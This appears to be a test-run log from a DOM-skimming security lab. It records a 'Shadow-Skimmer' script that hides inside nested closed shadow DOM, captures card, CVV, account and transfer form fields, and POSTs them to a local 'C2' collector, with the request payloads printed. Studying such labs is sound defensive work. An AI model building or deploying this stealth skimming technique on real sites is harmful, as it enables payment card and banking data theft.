ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869514118_l46kqicer 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869514118_o2siar95s 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Created 5 nested Shadow DOM levels 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Setting up cross-shadow boundary monitoring... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Cross-boundary monitoring established 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Starting periodic shadow data exfiltration... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing shadow stealth measures... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM skimmer attack initialized successfully 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-number_cardNumber_text_1762869514220_1c25a 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-holder-name_cardHolderName_text_1762869514220_etiy1 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-expiry_cardExpiry_text_1762869514220_snfal 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv-input_cvv_text_1762869514220_edm96 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv_cvv_text_1762869514220_w62zu 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_payment-account_accountNumber_text_1762869514220_8xs93 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_transfer-form_no-name_no-type_1762869514221_i940e 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_payment-form_no-name_no-type_1762869514221_3dquw 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_add-card-form_no-name_no-type_1762869514221_9bei8 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM stealth attack...
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM skimmer attack... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating nested Shadow DOM structure for enhanced stealth... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869514656_mdlfa5ni8 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869514656_wozqxhqle 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869514656_p4uplquuh 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869514657_t7ys7e2yh 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869514657_o8dyk2d4e 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Created 5 nested Shadow DOM levels 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Setting up cross-shadow boundary monitoring... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Cross-boundary monitoring established 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Starting periodic shadow data exfiltration... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing shadow stealth measures... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM skimmer attack initialized successfully 
  âœ˜  22 [chromium] â€º test/tests/lab2-improvements.spec.js:206:3 â€º Lab 2: DOM-Based Skimming - UI Improvements â€º should have fewer features and focus on cc-input page (6.9s)
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-number_cardNumber_text_1762869514759_fqswp 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-holder-name_cardHolderName_text_1762869514759_9hct9 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-expiry_cardExpiry_text_1762869514760_ggysf 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv-input_cvv_text_1762869514760_0ma1l 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv_cvv_text_1762869514760_v0lfh 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_payment-account_accountNumber_text_1762869514760_4dg4p 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_transfer-form_no-name_no-type_1762869514760_nxc3x 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_payment-form_no-name_no-type_1762869514761_7pmt4 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_add-card-form_no-name_no-type_1762869514761_4mbi9 
ğŸ“ Testing field monitoring through shadows...
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: blur for shadow_form_add-card-form_no-name_no-type_1762869514221_9bei8 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Scheduling immediate shadow exfiltration for: shadow_form_add-card-form_no-name_no-type_1762869514221_9bei8 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: blur for shadow_input_card-number_cardNumber_text_1762869514220_1c25a 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Scheduling immediate shadow exfiltration for: shadow_input_card-number_cardNumber_text_1762869514220_1c25a 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Exfiltrating shadow data for 1 sessions... 
ğŸŒ REQUEST TO C2: {
  url: [32m'http://localhost:9004/collect'[39m,
  method: [32m'POST'[39m,
  headers: {
    [32m'sec-ch-ua-platform'[39m: [32m'"macOS"'[39m,
    referer: [32m'http://localhost:9003/'[39m,
    [32m'user-agent'[39m: [32m'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36'[39m,
    [32m'sec-ch-ua'[39m: [32m'"Not=A?Brand";v="24", "Chromium";v="140"'[39m,
    [32m'content-type'[39m: [32m'application/json'[39m,
    [32m'sec-ch-ua-mobile'[39m: [32m'?0'[39m,
    [32m'accept-language'[39m: [32m'en-US'[39m
  },
  postData: [32m'{"type":"shadow_dom_capture","sessions":[{"elementId":"shadow_form_add-card-form_no-name_no-type_1762869514221_9bei8","elementInfo":{"tagName":"FORM","name":"add-card-form"},"capturedEvents":[{"timestamp":1762869515718,"eventType":"blur","value":""}],"capturedValues":[{"timestamp":1762869515718,"value":"","eventType":"blur"}],"capturedKeystrokes":[],"sessionDuration":1548}],"shadowInfo":{"shadowHostsCount":5,"maxDepth":5,"mode":"closed"},"metadata":{"timestamp":1762869515769,"url":"http://localhost:9003/banking.html","userAgent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36","attackType":"shadow-dom-stealth"}}'[39m
}
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Exfiltrating shadow data for 1 sessions... 
ğŸŒ REQUEST TO C2: {
  url: [32m'http://localhost:9004/collect'[39m,
  method: [32m'POST'[39m,
  headers: {
    [32m'sec-ch-ua-platform'[39m: [32m'"macOS"'[39m,
    referer: [32m'http://localhost:9003/'[39m,
    [32m'user-agent'[39m: [32m'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36'[39m,
    [32m'sec-ch-ua'[39m: [32m'"Not=A?Brand";v="24", "Chromium";v="140"'[39m,
    [32m'content-type'[39m: [32m'application/json'[39m,
    [32m'sec-ch-ua-mobile'[39m: [32m'?0'[39m,
    [32m'accept-language'[39m: [32m'en-US'[39m
  },
  postData: [32m'{"type":"shadow_dom_capture","sessions":[{"elementId":"shadow_input_card-number_cardNumber_text_1762869514220_1c25a","elementInfo":{"tagName":"INPUT","type":"text","name":"cardNumber"},"capturedEvents":[{"timestamp":1762869515719,"eventType":"blur","value":""}],"capturedValues":[{"timestamp":1762869515719,"value":"","eventType":"blur"}],"capturedKeystrokes":[],"sessionDuration":1556}],"shadowInfo":{"shadowHostsCount":5,"maxDepth":5,"mode":"closed"},"metadata":{"timestamp":1762869515776,"url":"http://localhost:9003/banking.html","userAgent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36","attackType":"shadow-dom-stealth"}}'[39m
}
ğŸ§ª Test Environment: local
ğŸ“ Home Index: http://localhost:3000
ğŸ“ Lab 1 Vulnerable: http://localhost:9001
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM skimmer attack... 
ğŸ“ Lab 1 C2: http://localhost:9002
ğŸ§ª Test environment: local
ğŸ“ Lab 2 Vulnerable URL: http://localhost:9003
ğŸ“ Lab 2 C2 URL: http://localhost:9004
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating nested Shadow DOM structure for enhanced stealth... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869515782_ltcdc0seg 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869515782_4vrzy65rz 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869515782_6k2mzr5y0 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869515782_8kyt2az1l 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869515783_7f0ibz6ht 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Created 5 nested Shadow DOM levels 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Setting up cross-shadow boundary monitoring... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Cross-boundary monitoring established 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Starting periodic shadow data exfiltration... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing shadow stealth measures... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM skimmer attack initialized successfully 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-number_cardNumber_text_1762869515884_j8v6a 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-holder-name_cardHolderName_text_1762869515885_0xodz 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-expiry_cardExpiry_text_1762869515885_asxgn 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv-input_cvv_text_1762869515885_erplu 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv_cvv_text_1762869515885_0exjn 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_payment-account_accountNumber_text_1762869515885_k7wey 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_transfer-form_no-name_no-type_1762869515885_wc5lr 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_payment-form_no-name_no-type_1762869515886_sbdjk 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_add-card-form_no-name_no-type_1762869515886_qkthi 
ğŸ“¥ RESPONSE FROM C2: {
  url: [32m'http://localhost:9004/collect'[39m,
  status: [33m200[39m,
  headers: {
    etag: [32m'W/"85-2t8om9mj9hDAJk97pU7YlDmkEpY"'[39m,
    connection: [32m'keep-alive'[39m,
    [32m'access-control-allow-origin'[39m: [32m'*'[39m,
    [32m'content-length'[39m: [32m'133'[39m,
    [32m'keep-alive'[39m: [32m'timeout=5'[39m,
    date: [32m'Tue, 11 Nov 2025 13:58:35 GMT'[39m,
    [32m'content-type'[39m: [32m'application/json; charset=utf-8'[39m,
    [32m'x-powered-by'[39m: [32m'Express'[39m
  }
}
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow data exfiltrated successfully 
ğŸ“¥ RESPONSE FROM C2: {
  url: [32m'http://localhost:9004/collect'[39m,
  status: [33m200[39m,
  headers: {
    etag: [32m'W/"85-T0/Dwu8o+ndok7FkQJ3jVZVYwYY"'[39m,
    connection: [32m'keep-alive'[39m,
    [32m'access-control-allow-origin'[39m: [32m'*'[39m,
    [32m'content-length'[39m: [32m'133'[39m,
    [32m'keep-alive'[39m: [32m'timeout=5'[39m,
    date: [32m'Tue, 11 Nov 2025 13:58:36 GMT'[39m,
    [32m'content-type'[39m: [32m'application/json; charset=utf-8'[39m,
    [32m'x-powered-by'[39m: [32m'Express'[39m
  }
}
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow data exfiltrated successfully 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: blur for shadow_form_add-card-form_no-name_no-type_1762869514761_4mbi9 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Scheduling immediate shadow exfiltration for: shadow_form_add-card-form_no-name_no-type_1762869514761_4mbi9 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: blur for shadow_input_card-number_cardNumber_text_1762869514759_fqswp 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Scheduling immediate shadow exfiltration for: shadow_input_card-number_cardNumber_text_1762869514759_fqswp 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Exfiltrating shadow data for 1 sessions... 
ğŸŒ REQUEST TO C2: {
  url: [32m'http://localhost:9004/collect'[39m,
  method: [32m'POST'[39m,
  headers: {
    [32m'sec-ch-ua-platform'[39m: [32m'"macOS"'[39m,
    referer: [32m'http://localhost:9003/'[39m,
    [32m'user-agent'[39m: [32m'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36'[39m,
    [32m'sec-ch-ua'[39m: [32m'"Not=A?Brand";v="24", "Chromium";v="140"'[39m,
    [32m'content-type'[39m: [32m'application/json'[39m,
    [32m'sec-ch-ua-mobile'[39m: [32m'?0'[39m,
    [32m'accept-language'[39m: [32m'en-US'[39m
  },
  postData: [32m'{"type":"shadow_dom_capture","sessions":[{"elementId":"shadow_form_add-card-form_no-name_no-type_1762869514761_4mbi9","elementInfo":{"tagName":"FORM","name":"add-card-form"},"capturedEvents":[{"timestamp":1762869516223,"eventType":"blur","value":""}],"capturedValues":[{"timestamp":1762869516223,"value":"","eventType":"blur"}],"capturedKeystrokes":[],"sessionDuration":1514}],"shadowInfo":{"shadowHostsCount":5,"maxDepth":5,"mode":"closed"},"metadata":{"timestamp":1762869516276,"url":"http://localhost:9003/banking.html","userAgent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36","attackType":"shadow-dom-stealth"}}'[39m
}
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Exfiltrating shadow data for 1 sessions... 
ğŸŒ REQUEST TO C2: {
  url: [32m'http://localhost:9004/collect'[39m,
  method: [32m'POST'[39m,
  headers: {
    [32m'sec-ch-ua-platform'[39m: [32m'"macOS"'[39m,
    referer: [32m'http://localhost:9003/'[39m,
    [32m'user-agent'[39m: [32m'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36'[39m,
    [32m'sec-ch-ua'[39m: [32m'"Not=A?Brand";v="24", "Chromium";v="140"'[39m,
    [32m'content-type'[39m: [32m'application/json'[39m,
    [32m'sec-ch-ua-mobile'[39m: [32m'?0'[39m,
    [32m'accept-language'[39m: [32m'en-US'[39m
  },
  postData: [32m'{"type":"shadow_dom_capture","sessions":[{"elementId":"shadow_input_card-number_cardNumber_text_1762869514759_fqswp","elementInfo":{"tagName":"INPUT","type":"text","name":"cardNumber"},"capturedEvents":[{"timestamp":1762869516224,"eventType":"blur","value":""}],"capturedValues":[{"timestamp":1762869516224,"value":"","eventType":"blur"}],"capturedKeystrokes":[],"sessionDuration":1518}],"shadowInfo":{"shadowHostsCount":5,"maxDepth":5,"mode":"closed"},"metadata":{"timestamp":1762869516277,"url":"http://localhost:9003/banking.html","userAgent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36","attackType":"shadow-dom-stealth"}}'[39m
}
ğŸ“¥ RESPONSE FROM C2: {
  url: [32m'http://localhost:9004/collect'[39m,
  status: [33m200[39m,
  headers: {
    etag: [32m'W/"85-+gHV+4Cbxwxl/KMX93leeeqQohQ"'[39m,
    connection: [32m'keep-alive'[39m,
    [32m'access-control-allow-origin'[39m: [32m'*'[39m,
    [32m'content-length'[39m: [32m'133'[39m,
    [32m'keep-alive'[39m: [32m'timeout=5'[39m,
    date: [32m'Tue, 11 Nov 2025 13:58:36 GMT'[39m,
    [32m'content-type'[39m: [32m'application/json; charset=utf-8'[39m,
    [32m'x-powered-by'[39m: [32m'Express'[39m
  }
}
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow data exfiltrated successfully 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: focus for shadow_form_add-card-form_no-name_no-type_1762869514761_4mbi9 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: focus for shadow_input_card-number_cardNumber_text_1762869514759_fqswp 
ğŸ“¥ RESPONSE FROM C2: {
  url: [32m'http://localhost:9004/collect'[39m,
  status: [33m200[39m,
  headers: {
    etag: [32m'W/"85-wBEKwcLgrzoZXWH4hT2Aipvhgvg"'[39m,
    connection: [32m'keep-alive'[39m,
    [32m'access-control-allow-origin'[39m: [32m'*'[39m,
    [32m'content-length'[39m: [32m'133'[39m,
    [32m'keep-alive'[39m: [32m'timeout=5'[39m,
    date: [32m'Tue, 11 Nov 2025 13:58:36 GMT'[39m,
    [32m'content-type'[39m: [32m'application/json; charset=utf-8'[39m,
    [32m'x-powered-by'[39m: [32m'Express'[39m
  }
}
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow data exfiltrated successfully 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: input for shadow_form_transfer-form_no-name_no-type_1762869514221_i940e 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: change for shadow_form_transfer-form_no-name_no-type_1762869514221_i940e 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: focus for shadow_form_transfer-form_no-name_no-type_1762869514221_i940e 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: input for shadow_form_transfer-form_no-name_no-type_1762869514221_i940e 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: change for shadow_form_transfer-form_no-name_no-type_1762869514221_i940e 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: blur for shadow_form_transfer-form_no-name_no-type_1762869514221_i940e 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Scheduling immediate shadow exfiltration for: shadow_form_transfer-form_no-name_no-type_1762869514221_i940e 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: focus for shadow_form_transfer-form_no-name_no-type_1762869514221_i940e 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: input for shadow_form_transfer-form_no-name_no-type_1762869514221_i940e 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Exfiltrating shadow data for 1 sessions... 
ğŸŒ REQUEST TO C2: {
  url: [32m'http://localhost:9004/collect'[39m,
  method: [32m'POST'[39m,
  headers: {
    [32m'sec-ch-ua-platform'[39m: [32m'"macOS"'[39m,
    referer: [32m'http://localhost:9003/'[39m,
    [32m'user-agent'[39m: [32m'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36'[39m,
    [32m'sec-ch-ua'[39m: [32m'"Not=A?Brand";v="24", "Chromium";v="140"'[39m,
    [32m'content-type'[39m: [32m'application/json'[39m,
    [32m'sec-ch-ua-mobile'[39m: [32m'?0'[39m,
    [32m'accept-language'[39m: [32m'en-US'[39m
  },
  postData: [32m'{"type":"shadow_dom_capture","sessions":[{"elementId":"shadow_form_transfer-form_no-name_no-type_1762869514221_i940e","elementInfo":{"tagName":"FORM","name":"transfer-form"},"capturedEvents":[{"timestamp":1762869516750,"eventType":"input","value":"checking"},{"timestamp":1762869516750,"eventType":"change","value":"checking"},{"timestamp":1762869516761,"eventType":"focus"},{"timestamp":1762869516764,"eventType":"input","value":"123456789","inputType":"insertText","data":"123456789"},{"timestamp":1762869516777,"eventType":"change","value":"123456789"},{"timestamp":1762869516778,"eventType":"blur","value":"123456789"},{"timestamp":1762869516779,"eventType":"focus"},{"timestamp":1762869516783,"eventType":"input","value":"2500.00","inputType":"insertText","data":"2500.00"}],"capturedValues":[{"timestamp":1762869516750,"value":"checking","eventType":"input"},{"timestamp":1762869516750,"value":"checking","eventType":"change"},{"timestamp":1762869516764,"value":"123456789","eventType":"input"},{"timestamp":1762869516777,"value":"123456789","eventType":"change"},{"timestamp":1762869516778,"value":"123456789","eventType":"blur"},{"timestamp":1762869516783,"value":"2500.00","eventType":"input"}],"capturedKeystrokes":[],"sessionDuration":2608}],"shadowInfo":{"shadowHostsCount":5,"maxDepth":5,"mode":"closed"},"metadata":{"timestamp":1762869516829,"url":"http://localhost:9003/banking.html","userAgent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36","attackType":"shadow-dom-stealth"}}'[39m
}
ğŸ“¥ RESPONSE FROM C2: {
  url: [32m'http://localhost:9004/collect'[39m,
  status: [33m200[39m,
  headers: {
    etag: [32m'W/"85-nZX0XQIZYnz/FNnqaEAl2TVTkn8"'[39m,
    connection: [32m'keep-alive'[39m,
    [32m'access-control-allow-origin'[39m: [32m'*'[39m,
    [32m'content-length'[39m: [32m'133'[39m,
    [32m'keep-alive'[39m: [32m'timeout=5'[39m,
    date: [32m'Tue, 11 Nov 2025 13:58:36 GMT'[39m,
    [32m'content-type'[39m: [32m'application/json; charset=utf-8'[39m,
    [32m'x-powered-by'[39m: [32m'Express'[39m
  }
}
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow data exfiltrated successfully 
ğŸ” Shadow access test results: {
  shadowHostsFound: [33m0[39m,
  accessibleShadowRoots: [33m0[39m,
  closedShadowRoots: [33m199[39m
}
ğŸ‘» Shadow hosts from attack: [33m5[39m
âœ… Closed shadow DOM infrastructure confirmed
ğŸ•µï¸ Testing anti-detection stealth measures...
  âœ˜  25 [chromium] â€º test/tests/shadow-skimmer.spec.js:166:3 â€º DOM-Based Skimming Lab - Shadow DOM Stealth Attack â€º should handle closed shadow DOM stealth (4.4s)
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM stealth attack...
ğŸ§ª Test Environment: local
ğŸ“ Home Index: http://localhost:3000
ğŸ“ Lab 1 Vulnerable: http://localhost:9001
ğŸ“ Lab 1 C2: http://localhost:9002
ğŸ§ª Test environment: local
ğŸ“ Lab 2 Vulnerable URL: http://localhost:9003
ğŸ“ Lab 2 C2 URL: http://localhost:9004
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM skimmer attack... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating nested Shadow DOM structure for enhanced stealth... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
